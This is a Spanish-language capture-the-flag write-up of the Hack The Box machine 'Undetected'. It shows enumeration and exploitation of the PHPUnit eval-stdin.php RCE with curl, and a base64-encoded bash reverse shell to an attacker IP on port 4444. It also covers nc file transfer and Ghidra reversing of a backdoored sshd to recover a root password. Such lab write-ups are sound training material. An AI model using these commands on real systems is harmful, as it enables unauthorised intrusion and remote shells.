---
layout: post
author: Sergio Salgado
---

## [](#header-2)Introduccion
Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos, su IP es `10.10.11.146`

![Scan 1](/assets/images/Undetected/scan1.png)

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

![nmap 1](/assets/images/Undetected/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

![nmap 2](/assets/images/Undetected/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos.

![nmap 3](/assets/images/Undetected/nmap3.png)

Despues veremos mas sobre los servicios que corren en el puerto 80 y 8000 con whatweb.

![whatweb](/assets/images/Undetected/whatweb.png)

Procedemos a enumerar dominios con gobuster

![whatweb](/assets/images/Undetected/gobuster.png)

```s
gobuster dir -u 10.10.11.146 -w /usr/share/wordlists/wfuzz/webservices/directory-list-2.3-medium.txt -t 200
```

En la pagina del puerto 80, vemos que hay un dominio que apunta a store.djewelry.htb y lo agregaremos a nuestro /etc/hosts.

Dentro no tiene nada interesante, sobre la informacion solamente nos informan que pronto migraran su servicio a otra pagina.

Procedemos a usar gobuster, esta vez con el dominio encontrado.

Dentro encontramos el directorio info y vendor, info es un archivo binario. Para descargarlo usaremos:

![Hash](/assets/images/Undetected/hash.png)

Y ademas dentro al analizarlo encontramos una linea codificada y para decodificarla usaremos:

```s
echo [Hash] | xxd -r -p
```

![Hash decoded](/assets/images/Undetected/echo_hash.png)

Antes de decodificarlo, vemos que el comando usado es un wget de un authorized_keys para el /root/.ssh/authorized_keys y agrega un hash dentro del archivo /etc/shadow.
Para decodificarlo usaremos jhon, con el comando:

```s
john hash2 -w=/usr/share/wordlists/rockyou.txt
```

![Password found](/assets/images/Undetected/password_founded.png)

Hemos encontrado una contrasena `ihatehackers`, pero no podemos usarla aun por que no conocemos aun ningun usuario.

Ahora revisaremos el archivo /vendor encontrado con gobuster.
Vemos demasiados archivos dentro de el directorio, nos metemos phpunit e investigamos sobre exploits para ese srvicio. 
En la busqueda de exploits, vemos que vendor/phpunit/php-code-coverage es vulnerable a RCE, esta vulnerabilidad no esta precisamente donde nos encontramos, pero sabemos que el servicio que lo usa tiene esa libreria dentro de su servicio de php. En <a href="https://gist.github.com/yassineaboukir/1501de6f60dce148824d3001e83fb263">GIT</a> encontraremos el exploit a este CVE. Lo usaremos de la siguiente manera:

```s
curl --data "<?php echo(pi());" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

Y probaremos ahora con:

```s
curl --data "<?php echo(shell_exec('whoami'));" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

![RCE](/assets/images/Undetected/rce.png)

Ahora podemos ir por la reverse shell, aunque primero la codificaremos en base64.

```s
echo "bash -i >& /dev/tcp/10.10.14.230/4444 0>&1" | base64
```

```s
curl --data "<?php echo(shell_exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMzAvNDQ0NCAwPiYxCg== | base64 -d | bash'));" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

![Reverse shell code](/assets/images/Undetected/reverse_shell1.png)

Y de nuestro lado nos ponemos en escucha por el puerto 4444 para recibir la conexion.

![Reverse success](/assets/images/Undetected/reverse1_success.png)

Una vez dentro, listaremos los usuarios con un:

```s
cat /etc/passwd | grep -i sh$
```

![/etc/passwd](/assets/images/Undetected/etc_passwd.png)

Ahora podemos intentar usar la contrasena que obtuvimos anteriormente, les adelanto que es para el usuario steven1, aunque si listamos el id, vemos que es aun asi steven jeje. Y ahora si navegamos a /home/steven/usr.txt podremos leer la flag.

Con Linpeas hemos encontrado un correo para steven. El mail nos dice que hay un extrano comportamiento para el servicio de Apache, asi que lo movieron temporalmente.

![Steven mail](/assets/images/Undetected/steven_mail.png)

Ahora nos moveremos para el directorio de Apache2 en /etc/apache2. Despues nos vamos para /usr/lib/apache2. Dentro hay un directorio llamado modules, y los listaremos por ultimo actualizado con:

```s
ls -ltrh
```

![sort by last updated](/assets/images/Undetected/ls_modules.png)

Hay un archivo llamado mod_reader.so, asi que lo mandaremos a nuestra maquina desde la maquina de steven con un:

Primero del lado que recibe, la maquina kali lo podemos descargar con un:

```s
nc -lp 9001 > mod_reader.so
```

Despues del lado que mandara el archivo ponemos un:

```s
nc -w 3 10.10.14.230 9001 < mod_reader.so 
```

Listo, ahora procederemos a leer el archivo, ya que dentro tambien tiene informacion valiosa como el anterior

```s
strings mod_reader.so
```

Con un strings lo leemos y encontramos de nuevo una cadena en base64, despues de decodificarla vemos que descarga una image.png y la guarda como sshd y dambien cambia la fecha asi que no podemos encontrarla con el filtrado de ultima modificacion.

Procedemos a descargar ese sshd.

Lo analizaremos con la herramienta hidra, que nos permite analizar malware; abrimos el programa, iniciamos un nuevo proyecto y arrastramos el archivo sshd, le daremos click derecho para abrir con la herramienta por default y despues que abra, le daremos que lo analice, por que si no no cargara las funciones que contenga el archivo.

Lo primero que se sugiere siempre es filtrar el resultado por password, para tener rapida la victoria en texto plano.
Y se encuentra una funcion llamada `auth_password`. Y dentro hay un arreglo que contiene un backdoor dentro que pesa 31 bytes. Y guardare esos datos en un archivo llamado decompile.c para que la syntax se ilumine bien.

![ghidra1](/assets/images/Undetected/hidra1.png)

![decompile.c](/assets/images/Undetected/decompile_c.png)

Tenemos un valor negativo `-0x5b` que vendria siendo el valor invalido, veamos con ghidra la representacion del caracter y nos muestra ques es un /0xa5.

![Ghidra](/assets/images/Undetected/ghidra2.png)

Ahora, usaremos Cyberchef para meter el swap endianess. Usaremos 31 bytes por que anteriormente vimos que el arreglo donde entra es de 31 bytes.

![cyberchef](/assets/images/Undetected/cyberchef.png)

Ahora lo convertiremos a hex. Tambien tenemos que hacer un xor y en la key le pondremos 96, por que podemos ver en el codigo anterior, que entra en un while loop xor con 0x96. Y hemos obtenido la contrasena de root.

![cyberchef 2](/assets/images/Undetected/cyberchef2.png)

Ahora si podemos establecer una shell con el usuario root y leer nuestra flag.

![cyberchef 2](/assets/images/Undetected/root_flag.png)

![cyberchef 2](/assets/images/Undetected/undetected_powned.png)